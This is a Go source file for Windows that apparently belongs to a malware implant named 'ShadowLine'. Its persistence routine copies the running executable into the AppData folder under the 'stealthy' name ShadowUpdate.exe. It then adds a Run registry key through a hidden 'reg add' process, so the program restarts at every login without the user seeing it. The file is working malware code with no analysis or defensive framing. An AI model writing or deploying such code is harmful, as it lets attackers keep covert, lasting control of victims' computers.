//go:build windows

package main

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
)

// Persistence configuration
const (
	PersistDirName  = "ShadowLine"       // Folder in AppData
	PersistFileName = "ShadowUpdate.exe" // Stealthy name
	RegKeyName      = "ShadowLineUpdate" // Registry key name
)

func installPersistence() {
	// 1. Get current executable path
	exePath, err := os.Executable()
	if err != nil {
		return
	}

	// 2. Define target path (%APPDATA%\ShadowLine\ShadowUpdate.exe)
	appData := os.Getenv("APPDATA")
	targetDir := filepath.Join(appData, PersistDirName)
	targetPath := filepath.Join(targetDir, PersistFileName)

	// 3. Check if we are already running from the target location
	if strings.EqualFold(exePath, targetPath) {
		// We are already persistent. Do nothing.
		return
	}

	// 4. Create Directory if not exists
	if _, err := os.Stat(targetDir); os.IsNotExist(err) {
		os.MkdirAll(targetDir, 0755)
	}

	// 5. Copy executable to target
	if err := copyFile(exePath, targetPath); err != nil {
		return // Failed to copy
	}

	// 6. Add to Registry (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)
	// We use "reg add" command silently
	cmd := exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", RegKeyName, "/t", "REG_SZ", "/d", targetPath, "/f")

	// Ghost Mode for the reg command
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000,
	}

	cmd.Run()

	fmt.Println("[*] Persistence installed via Registry.")
}

// Helper function to copy file
func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	return err
}
